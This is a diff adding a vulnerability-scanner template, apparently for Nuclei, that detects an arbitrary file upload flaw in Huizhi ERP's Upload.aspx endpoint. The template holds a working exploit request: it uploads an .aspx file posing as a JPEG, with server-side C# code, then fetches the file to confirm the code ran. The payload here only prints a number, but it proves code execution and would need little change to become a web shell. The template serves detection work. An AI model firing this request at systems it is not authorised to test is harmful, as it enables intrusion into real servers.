@@ -1,0 +1,89 @@
+id: huizhi-erp-upload
+info:
+  name: Huizhi ERP Upload.aspx File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,huizhi-erp
+  description: |
+    This template detects a file upload vulnerability in the Upload.aspx endpoint of Huizhi ERP, allowing arbitrary file uploads.
+
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(6))}}"
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{rand_int(100,1000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/nssys/common/Upload.aspx?Action=DNPageAjaxPostBack"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLkkAXATqVKBHZ8zk
+    body: |
+      ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+      Content-Disposition: form-data; name="__VIEWSTATE"
+
+      /wEPDwUJOTc0NzkxMzQ1D2QWAgIDDxYGHhdJc0JlZm9yZU9wZXJhdGVTYXZlRGF0YWgeBmlzZ3VpZAUBMR4OY2hlY2tmb3Jtc3RhdGUFATBkZHwobq1hNj9MTgjOtrIn/0gbCdhD
+      ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+      Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+      573D6CFB
+      ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+      Content-Disposition: form-data; name="upfile_Input"
+
+
+      ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+      Content-Disposition: form-data; name="upfile_upload"; filename="1"
+      Content-Type: image/jpeg
+
+      <!DOCTYPE html>
+      <html>
+      <head>
+      <title>vulnerability</title>
+      </head>
+      <body>
+      <%@ Page Language="C#" %>
+      <% Response.Write({{t1}}*{{t2}}); %>
+      </body>
+      </html>
+      ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+      Content-Disposition: form-data; name="upfilename"
+
+      {{filename}}.aspx
+      ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+      Content-Disposition: form-data; name="dnpostmethodname"
+
+      uploadfile
+      ------WebKitFormBoundaryLkkAXATqVKBHZ8zk--
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "/Upload/(?P<date>.*?)/"
+    extractors:
+      - type: regex
+        name: date
+        internal: true
+        part: body
+        regex:
+          - "/Upload/(?P<date>.*?)/"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/Upload/{{date}}/{{filename}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "vulnerability"
+          - "{{t3}}"
+      - type: status
+        status:
+          - 200
